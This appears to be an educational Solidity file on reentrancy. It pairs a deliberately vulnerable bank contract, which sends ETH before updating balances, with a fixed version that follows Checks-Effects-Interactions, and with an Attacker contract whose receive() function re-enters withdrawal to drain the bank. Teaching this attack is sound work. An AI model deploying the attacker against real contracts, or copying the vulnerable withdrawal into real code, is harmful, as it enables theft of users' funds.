// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE contract for educational purposes
 * DO NOT USE IN PRODUCTION
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ❌ VULNERABLE: External call before state update
    function withdrawVulnerable(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // DANGER: External call before updating state
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // TOO LATE: Attacker already re-entered
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title SecureBank
 * @notice SECURE implementation using Checks-Effects-Interactions pattern
 */
contract SecureBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ✅ SECURE: Checks-Effects-Interactions pattern
    function withdraw(uint256 amount) public {
        // CHECKS
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // EFFECTS (update state BEFORE external call)
        balances[msg.sender] -= amount;
        
        // INTERACTIONS (external calls LAST)
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Attacker
 * @notice Malicious contract that exploits reentrancy
 * FOR EDUCATIONAL PURPOSES ONLY
 */
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackAmount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        
        bank.deposit{value: msg.value}();
        bank.withdrawVulnerable(msg.value);
    }
    
    // Fallback function - this is where reentrancy happens
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdrawVulnerable(attackAmount);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
